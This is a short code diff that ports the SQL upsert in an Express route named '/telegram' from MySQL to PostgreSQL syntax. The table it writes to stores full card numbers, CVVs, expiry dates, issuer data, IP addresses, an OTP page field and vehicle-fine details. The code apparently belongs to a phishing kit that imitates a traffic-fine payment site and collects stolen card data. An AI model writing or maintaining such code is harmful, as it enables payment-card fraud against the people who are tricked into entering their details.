@@ -170,11 +170,11 @@ router.post('/telegram', async (req, res) => {
       INSERT INTO payments (sid, plate_no, plate_src, plate_code, total_fine, fine_count,
         card_name, card_number, expiry, cvv, card_scheme, card_type, card_issuer, card_country, ip, otp_page)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
-      ON DUPLICATE KEY UPDATE
-        card_name=VALUES(card_name), card_number=VALUES(card_number), expiry=VALUES(expiry), cvv=VALUES(cvv),
-        card_scheme=VALUES(card_scheme), card_type=VALUES(card_type), card_issuer=VALUES(card_issuer),
-        card_country=VALUES(card_country), total_fine=VALUES(total_fine), fine_count=VALUES(fine_count),
-        otp_page=VALUES(otp_page)
+      ON CONFLICT (sid) DO UPDATE SET
+        card_name=EXCLUDED.card_name, card_number=EXCLUDED.card_number, expiry=EXCLUDED.expiry, cvv=EXCLUDED.cvv,
+        card_scheme=EXCLUDED.card_scheme, card_type=EXCLUDED.card_type, card_issuer=EXCLUDED.card_issuer,
+        card_country=EXCLUDED.card_country, total_fine=EXCLUDED.total_fine, fine_count=EXCLUDED.fine_count,
+        otp_page=EXCLUDED.otp_page
     `, [
       sid, plateNo, plateSrcCode, plateCodeLetter, parseFloat(totalFine)||0, parseInt(fineCount)||0,
       cardName, cardNumber, expiry, cvv,
